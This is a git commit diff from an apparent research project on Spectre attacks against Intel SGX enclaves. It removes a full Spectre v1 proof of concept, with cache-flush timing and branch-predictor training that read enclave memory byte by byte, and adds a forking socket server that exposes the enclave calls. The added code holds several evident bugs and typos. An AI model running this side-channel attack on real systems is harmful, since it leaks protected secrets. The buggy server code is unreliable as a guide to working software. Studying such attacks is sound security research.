3029356c030a67c8fcfcd689578b41d289c39b3b
Suhho <suhho1993@gmail.com>
2018-05-29 11:51:27 +0900

    Added socket functions to main.c and moved attack codes to MIC.c

---
+++ SGXSpectre/main/MIC.h
@@ -0,0 +1,12 @@
+//Socket structures 
+typedef struct victim_in{
+	size_t x;
+	uint8_t* array2;
+	unsigned int* array1_size;
+}victim_in;
+
+typedef struct offset_out{
+	size_t malicious_x;
+}offset_out;
+
+	
--- SGXSpectre/main/main.c
+++ SGXSpectre/main/main.c
@@ -18,6 +18,11 @@
 #include <assert.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/inet.h>
+
+
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -27,127 +32,142 @@
 
 #include "enclave_u.h"
 #include "enclave_init.h"
+#include "MIC.h"
 
 extern sgx_enclave_id_t global_eid;
 
-unsigned int array1_size = 16;
-uint8_t unused1[64];
-uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
-uint8_t unused2[64];
-uint8_t array2[256 * 512];
-
-/********************************************************************
- Analysis code
-********************************************************************/
- #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
-
- /* Report best guess in value[0] and runner-up in value[1] */
- void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-	static int results[256];
-	int tries, i, j, k, mix_i; 
-	unsigned int junk = 0;
-	size_t training_x, x;
-	register uint64_t time1, time2;
-	volatile uint8_t *addr;
+int socket_ecall_offset(offset_out* out)
+{
+	size_t malicious_x;
+	sgx_status_t sgx_ret = SGX_ERROR_UNEXPECTED;
 	
-	for (i = 0; i < 256; i++)
-		results[i] = 0;
-
-	for (tries = 999; tries > 0; tries--) {
-		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
-		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
-
-		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--) {
-			_mm_clflush(&array1_size);
-			volatile int z;
-			for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
-			
-			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-			x = training_x ^ (x & (malicious_x ^ training_x));
-			
-			/* Call the victim! */ 
-  		        sgx_status_t ret = SGX_ERROR_UNEXPECTED;
-			ret = ecall_victim_function(global_eid, x, array2, &array1_size);
-    			if (ret != SGX_SUCCESS)
-        			abort();
-		}
-		
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		for (i = 0; i < 256; i++) {
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-			//if (time2 <= CACHE_HIT_THRESHOLD)
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
-			{
-				results[mix_i]++; /* cache hit - add +1 to score for this value */
-			}
-		}
-		
-		/* Locate highest & second-highest results results tallies in j/k */
-		j = k = -1;
-		for (i = 0; i < 256; i++) {
-			if (j < 0 || results[i] >= results[j]) {
-				k = j;
-				j = i;
-			} else if (k < 0 || results[i] >= results[k]) {
-				k = i;
-			}
-		}
-
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
-		}
-
-	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-	value[0] = (uint8_t)j;
-	score[0] = results[j];
-	value[1] = (uint8_t)k;
-	score[1] = results[k];
- }
-
-
-int spectre_main(int argc, char **argv) {
-	size_t malicious_x; 
-	sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
-	if (ret != SGX_SUCCESS)
-        	abort();
-
-	
-	int i, score[2], len=40;
-	uint8_t value[2];
-	
-	for (i = 0; i < sizeof(array2); i++)
-		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-
-	if (argc == 3) {
-		sscanf(argv[1], "%p", (void**)(&malicious_x));
-		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
-		sscanf(argv[2], "%d", &len);
-	}
-	
-	printf("Reading %d bytes:\n", len);
-	
-	while (--len >= 0) {
-		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
-		readMemoryByte(malicious_x++, value, score);
-		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
-		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-		if (score[1] > 0)
-			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-		printf("\n");
+	sgx_ret = ecall_get_offset(global_eid, &malicious_x);
+	if(sgx_ret != SGX_SUCCESS){
+		abort();
+		return -1;
 	}
 
-	return (0);
- }
+	out->malicious_x = malicious_x;
+	return 0;
+}
+
+
+int socket_ecall_victim_fucntion(victim_in* in)
+{
+	ecall_victim_function(global_eid, in->x, in->array2, in->array1_size);
+	if(ret !=SGX_SUCCESS){
+		abort();
+		return -1;
+	}
+	return 0;
+}
+
+void socket_init( int port_num)
+{
+	int fd_sock, cli_sock;
+	int ret;
+	struct sockaddr_in addr;
+	ssize_t len;
+	
+	fd_sock = socket(AF_INET, SOCKET_STREAM, 0);
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = htons (INADDR_ANY);
+	addr.sin_port = htons (port_num);
+	ret = bind (fd_sock, (struct sockaddr *)&addr, sizeof(addr));
+	if( ret == -1){
+		printf("socket listen error\n");
+		close(fd_sock);
+		return;
+	}
+	
+	while(1){
+		//listen
+		ret = listen(fd_sock, 0);
+		if(ret < 0){
+			printf("Listen error\n");
+			close(fd_sock);
+			return;
+		}
+
+		cli_sock = accept(fd_sock, (struct sockaddr *)NULL, NULL);
+		if(cli_sock == -1){
+			pritnf("socket accept error\n");
+			close(fd_sock);
+			return ;
+		}
+
+		pid_t pid = fork();
+		if(pid == -1){
+			printf("fork fail\n");
+			close(fd_sock);
+			return;
+		}
+		else if(pid>0){
+			//parent
+			//close client socket for listening 
+			close(cli_sock);
+		}
+		else if(pid==0){
+			int req =0;
+
+			//child
+			//close parent socket to dedicate to communication
+			close(fd_sock);
+
+			len= read(cli_sock, &req, sizeof(req));
+			if(len <=0){
+				printf("read fail\n");
+				close(cli_sock);
+				exit(1);
+			}
+
+			if(req == 1){
+				printf("scket_ecall_offset\n");
+				offset_out out;
+				ret=socket_ecall_offset(&out);
+				if(ret<0){
+					printf("ecall_offset_fail\n");
+					close(cli_sock);
+					exit(1);
+					return;
+				}
+				write(cli_sock, &out, sizeof(out));
+
+				close(cli_sock);
+				exit(1);
+			}
+			else if(req == 2){
+				printf("socket_ecall_victim_fucntion\n");
+				victim_in in;
+				socket_ecall_victim_function(&in);
+				write(cli_sock, &in, sizeof(in));
+				if(ret<0){
+					printf("ecall_victim_fail\n");
+					close(cli_sock);
+					exit(1);
+					return;
+				}
+				close(cli_sock);
+				exit(1);
+			}
+		}
+	}
+	close(fd_sock);
+	return;
+}
+
+
+
+
+
+
+
+
+
+
+
 
 /* Application entry */
 int main(int argc, char *argv[])
